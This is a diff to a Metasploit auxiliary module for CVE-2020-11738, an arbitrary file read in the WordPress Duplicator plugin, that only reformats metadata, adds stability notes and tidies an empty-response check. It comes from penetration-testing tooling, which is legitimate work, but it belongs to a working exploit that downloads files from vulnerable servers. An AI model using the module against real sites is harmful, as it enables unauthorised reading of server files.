@@ -18,19 +18,22 @@ class MetasploitModule < Msf::Auxiliary
           'Duplicator' version 1.3.24-1.3.26, allowing arbitrary file read with the web server privileges.
           This vulnerability was being actively exploited when it was discovered.
         },
-        'References' =>
-          [
-            ['CVE', '2020-11738'],
-            ['WPVDB', '10078'],
-            ['URL', 'https://snapcreek.com/duplicator/docs/changelog']
-          ],
-        'Author' =>
-          [
-            'Ramuel Gall', # Vulnerability discovery
-            'Hoa Nguyen - SunCSR Team' # Metasploit module
-          ],
+        'References' => [
+          ['CVE', '2020-11738'],
+          ['WPVDB', '10078'],
+          ['URL', 'https://snapcreek.com/duplicator/docs/changelog']
+        ],
+        'Author' => [
+          'Ramuel Gall', # Vulnerability discovery
+          'Hoa Nguyen - SunCSR Team' # Metasploit module
+        ],
         'DisclosureDate' => '2020-02-19',
-        'License' => MSF_LICENSE
+        'License' => MSF_LICENSE,
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS],
+          'Reliability' => []
+        }
       )
     )
 
@@ -63,7 +66,7 @@ class MetasploitModule < Msf::Auxiliary
 
     fail_with Failure::Unreachable, 'Connection failed' unless res
     fail_with Failure::NotVulnerable, 'Connection failed. Nothing was downloaded' if res.code != 200
-    fail_with Failure::NotVulnerable, 'Nothing was downloaded. Change the DEPTH parameter' if res.body.length.zero?
+    fail_with Failure::NotVulnerable, 'Nothing was downloaded. Change the DEPTH parameter' if res.body.empty?
 
     print_status('Downloading file...')
     print_line("\n#{res.body}\n")
